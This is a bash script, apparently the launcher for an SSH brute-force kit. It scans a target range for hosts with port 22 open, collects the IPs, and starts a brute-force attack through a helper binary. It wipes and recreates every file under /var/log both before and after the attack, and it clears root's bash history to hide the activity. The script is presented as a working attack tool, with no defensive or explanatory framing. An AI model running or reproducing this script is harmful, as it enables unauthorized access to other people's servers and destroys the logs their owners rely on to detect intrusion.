#!/bin/bash
echo -e "\e[0;36mMax Process"
read process
echo "$(ls /var/log/)">cleanlist
while read line
do   
rm -rf /var/log/$line
touch /var/log/$line
done < cleanlist
green='\E[32;40m'
col=( '\E[31;40m' '\E[32;40m' '\E[33;40m' '\E[34;40m' '\E[35;40m' '\E[36;40m' '\E[37;40m' )
echo -e "$green Loading ...."
echo -e ""
sleep 2
cat motd
echo "Scanning $1 for open ssh ips."
./class 22 -a $1 -i eth0 -s 10 >/dev/null
cat bios.txt |sort | uniq > mfu.txt
oopsnr2=`grep -c . mfu.txt`
echo -e "Found $oopsnr2 ip's"
echo "SSH BruteForce Started"
./update $process
rm -rf /root/.bash_history ; touch /root/.bash_history ; history -r ; 
echo "$(ls /var/log/)">cleanlist
while read line
do
rm -rf /var/log/$line
touch /var/log/$line
done < cleanlist
sleep 5

